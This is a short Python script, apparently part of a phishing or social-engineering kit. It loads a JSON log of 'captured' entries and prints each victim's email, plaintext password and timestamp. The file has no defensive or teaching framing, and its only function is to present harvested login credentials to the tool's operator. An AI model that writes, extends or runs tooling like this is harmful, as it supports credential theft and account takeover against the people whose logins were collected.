import os
import json

LOG_PATH = os.path.join(os.path.dirname(__file__), 'logs', 'social_log.json')

def exibir_logs():
    if not os.path.exists(LOG_PATH):
        print("⚠️ Arquivo de log não encontrado.")
        return

    try:
        with open(LOG_PATH, 'r', encoding='utf-8') as f:
            dados = json.load(f)
    except json.JSONDecodeError:
        print("⚠️ Erro ao ler o arquivo JSON.")
        return

    if not dados:
        print("📭 Nenhum dado encontrado no log.")
        return

    print(f"\n📒 Logs capturados ({len(dados)} entrada(s)):\n")
    for entrada in dados:
        email = entrada.get("email", "[sem email]")
        senha = entrada.get("password", "[sem senha]")
        timestamp = entrada.get("timestamp", "[sem data]")
        print(f"[{timestamp}] Email: {email} | Senha: {senha}")

if __name__ == "__main__":
    exibir_logs()
